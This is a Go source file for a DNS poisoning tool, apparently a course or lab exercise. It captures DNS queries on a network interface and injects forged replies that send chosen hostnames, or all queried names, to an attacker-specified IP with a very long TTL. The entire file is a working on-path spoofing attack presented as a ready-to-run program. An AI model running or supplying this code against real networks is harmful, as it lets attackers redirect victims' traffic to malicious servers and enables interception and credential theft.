package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

var (
	// Default interface set to 'eth0'. iface indicates '-i' parameter.
    iface 		string = "eth0"
    // Default mode is not any specific string for hostnames. specifying the hostnames to be hijacked.
	hostnames_file 	string = ""
    // Default mode is dumping all captured packets The optional <expression> argument is a BPF filter that specifies a subset ofthe traffic to be monitored. Expression parameter should be given in "" characters.
    expression 	string = ""
    snapshotLen int32  = 65535
    promiscuous bool   = true
    err         error
    timeout     time.Duration = -1 * time.Second
    handle      *pcap.Handle
)


// Make all argument operations there, for ease of understanding code.
// This function works with 'findMaxValue' to detect <expression> field.
// Thus, user can give parameters (except expression ofc.) in random order. 
func argumentOperations() {
	// Handle CLI arguments: (-i, -f, <expression> can be given in mixed order!)
	arguments := os.Args
	// To keep readed index in arguments, so can find 'expression' part properly.
	var readed_arguments_index []int
	for index, element := range arguments {
		if element == "-i" {
			iface = arguments[index + 1]
			readed_arguments_index = append(readed_arguments_index, index + 1)
		} else if element == "-f" {
			hostnames_file = arguments[index + 1]
			readed_arguments_index = append(readed_arguments_index, index + 1)
		} else if string([]rune(element)[0]) == "-" {
			fmt.Println("UNKNOWN PARAMETER")
			os.Exit(3)
		}
	}

	if len(arguments) - 1 > findMaxValue(readed_arguments_index) {
		for i := findMaxValue(readed_arguments_index) + 1; i < len(arguments); i++ {
			expression += arguments[i] + " "
		}
	}
}


// This function is used for getting IP addresses and hostnames from given file (-f parameter).
// It returns two different string slices.
func getIPHostnameFromFile(filename string) ([]string, []string) {
	var ip_addresses []string
	var hostnames []string

	_,_ = ip_addresses, hostnames

	file, err := os.Open(filename)
    if err != nil {
        log.Fatalf("failed to open")
    }

	scanner := bufio.NewScanner(file)
	scanner.Split(bufio.ScanLines)
  
    for scanner.Scan() {
        ip_host := strings.Split(scanner.Text(), " ")
		ip_addresses = append(ip_addresses, ip_host[0])
		hostnames = append(hostnames, ip_host[1])
	}
  
    file.Close()

	return ip_addresses, hostnames
}


// If '-f' is not specified, dnspoison should forge replies to 
// all observed requests with the chosen interface's IP address as an answer.
// Thus, this function used for getting interface's ip address.
func getInterfaceIP(iface string) (ipv4_addr string, err error) {
    var (
        ief      *net.Interface
        addrs    []net.Addr
        ipv4Addr net.IP
    )

	// Get interface
    if ief, err = net.InterfaceByName(iface); err != nil { 
        return
    }

	// Get interface address
    if addrs, err = ief.Addrs(); err != nil {
        return
    }

	// Get interface ipv4 address
    for _, addr := range addrs {
        if ipv4Addr = addr.(*net.IPNet).IP.To4(); ipv4Addr != nil {
            break
        }
    }
    if ipv4Addr == nil {
        return "", fmt.Errorf(fmt.Sprintf("interface %s don't have an ipv4 address\n", iface))
    }
    return ipv4Addr.String(), nil
}


func findMaxValue(s []int) int {
    // This function used for properly split user parameters.
    maxValue := 0
    for _, element := range s {
        if element > maxValue {
            maxValue = element
        }
    }
    return maxValue
}

// net.IP takes Ip address as byte slice, thus need to convert it to proper format.
func ipToBytes(ip_address string) []byte {
	var target_ip_bytes []byte
	for _, e := range strings.Split(ip_address, ".") {
		int_ver, _ := strconv.Atoi(e)
		target_ip_bytes = append(target_ip_bytes, byte(int_ver))
	}

	return target_ip_bytes
}


// This is the function that will be executed for every captured packet.
func analyzePacket(packet gopacket.Packet) {
	// Predefine:
	var ethernet_frame *layers.Ethernet
	var ipv4_packet *layers.IPv4
	var dns_packet *layers.DNS
	var udp_packet *layers.UDP

	// Capture Ethernet frames (Link layer):
	ethernet_layer := packet.Layer(layers.LayerTypeEthernet)
	if ethernet_layer != nil {
		ethernet_frame = ethernet_layer.(*layers.Ethernet)
		_ = ethernet_frame
	}

	// Capture IPv4 packets (Network layer):
	ipv4_layer := packet.Layer(layers.LayerTypeIPv4)
	if ipv4_layer != nil {
		ipv4_packet = ipv4_layer.(*layers.IPv4)
		_ = ipv4_packet
	}

	udp_layer := packet.Layer(layers.LayerTypeUDP)
	if udp_layer != nil {
		udp_packet = udp_layer.(*layers.UDP)
		_ = udp_packet
	}

	// Capture DNS packets:
	dns_layer := packet.Layer(layers.LayerTypeDNS)


	//should support just plain (UDP) DNS traffic over port 53.
	if dns_layer != nil{
		dns_packet = dns_layer.(*layers.DNS)
		if !dns_packet.QR && dns_packet.Questions[0].Type == 1 && udp_layer != nil && udp_packet.DstPort == 53{
		// Get ip-hostname information from file.
			if hostnames_file != "" {
				ip_addresses, hostnames := getIPHostnameFromFile(hostnames_file)
			
				for i, host := range hostnames {
					// Check if DNS Query's target exists in hostname file:
					if host == string(dns_packet.Questions[0].Name) {
						fmt.Println("-----------------------------------------------------")
						fmt.Println("DNS QUERY DETECTED FOR TARGET ->", string(dns_packet.Questions[0].Name))
						fmt.Println("STARTING TO INJECT DNS RESPONSES WITH IP:", ip_addresses[i])

						target_ip_bytes := ipToBytes(ip_addresses[i])

						injectPackets(ethernet_frame, ipv4_packet, dns_packet, udp_packet, target_ip_bytes)
					}
				}
			} else {
				// If there is no -f parameter with hostname file, then try to poison all dns queries with
				// interface's default ip.
				interface_ip, _ := getInterfaceIP(iface)
				target_ip_bytes := ipToBytes(interface_ip)
				
				fmt.Println("-----------------------------------------------------")
				fmt.Println("DNS QUERY DETECTED FOR TARGET ->", string(dns_packet.Questions[0].Name))
				fmt.Println("STARTING TO INJECT DNS RESPONSES WITH IP:", interface_ip)
				
				injectPackets(ethernet_frame, ipv4_packet, dns_packet, udp_packet, target_ip_bytes)
			}
		}
	}
}


// If all conditions are met, start to inject packets:
func injectPackets(ethernet_frame *layers.Ethernet, ipv4_packet *layers.IPv4, dns_packet *layers.DNS, udp_packet *layers.UDP, target_ip []byte) {
	for a:=0; a<5; a++ {
		ethernet_frame_copy := *ethernet_frame
		ipv4_packet_copy := *ipv4_packet
		udp_packet_copy := *udp_packet
		dns_packet_copy := *dns_packet

		// Change source<->destination mac addresses.
		ethernet_frame_copy.DstMAC = ethernet_frame.SrcMAC
		ethernet_frame_copy.SrcMAC = ethernet_frame.DstMAC

		// Change source<->destination ip addresses.
		ipv4_packet_copy.DstIP = ipv4_packet.SrcIP
		ipv4_packet_copy.SrcIP = ipv4_packet.DstIP

		// Change source<->destination ports.
		udp_packet_copy.DstPort = udp_packet.SrcPort
		udp_packet_copy.SrcPort = udp_packet.DstPort

		// Need to calculate checksum again, otherwise it gives error.
		udp_packet_copy.SetNetworkLayerForChecksum(&ipv4_packet_copy)

		// Change dns packet's specific fields:
		// QR=1 denotes it is response. 
		// RA denotes recursion available.
		// Response Code = 0 means "No error condition"
		// ANCount is the count of the answers. We can set it basically to 1.
		dns_packet_copy.QR = true
		dns_packet_copy.RA = true
		dns_packet_copy.ResponseCode = 0
		dns_packet_copy.ANCount = 1

		// Create newrecord for DNS Response's Answers field.
		// I set TTL to 2140000 which is quite high:) but I think it is optional.
		var newrecord layers.DNSResourceRecord
		newrecord.Name = dns_packet.Questions[0].Name
		newrecord.Type = dns_packet.Questions[0].Type
		newrecord.Class = dns_packet.Questions[0].Class
		newrecord.TTL = 2140000
		newrecord.DataLength = 4
		newrecord.Data = target_ip
		newrecord.IP = net.IP(target_ip)

		// Set new dns packet's Answers field to newly created 'newrecord'
		dns_packet_copy.Answers = make([]layers.DNSResourceRecord, 1)
		dns_packet_copy.Answers[0] = newrecord

		// Set buffer and options field to inject packet.
		var buffer gopacket.SerializeBuffer
		var options gopacket.SerializeOptions
		options.ComputeChecksums = true
		options.FixLengths = true

		// Encode layer and send it.
		buffer = gopacket.NewSerializeBuffer()
		gopacket.SerializeLayers(buffer, options,
			&ethernet_frame_copy,
			&ipv4_packet_copy,
			&udp_packet_copy,
			&dns_packet_copy,
		)

		new_message := buffer.Bytes()
		err = handle.WritePacketData(new_message)
	}
}


func main() {
	fmt.Println("\n******************************************")
	fmt.Println("DNS POISON STARTED")
	fmt.Println("******************************************")
	fmt.Println()

	argumentOperations()

	handle, err = pcap.OpenLive(iface, snapshotLen, promiscuous, timeout)
	if err != nil {
		log.Fatal(err)
	}
	defer handle.Close()


	if expression != "" {
        // If some expression like "tcp and port 80" is specified, then set the BPFFilter:
        err = handle.SetBPFFilter(expression)
        if err != nil {
            log.Fatal(err)
        }
        fmt.Println("BPF filter detected. Only capturing ", expression)
    }

	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	for packet := range packetSource.Packets() {
		analyzePacket(packet)
	}
}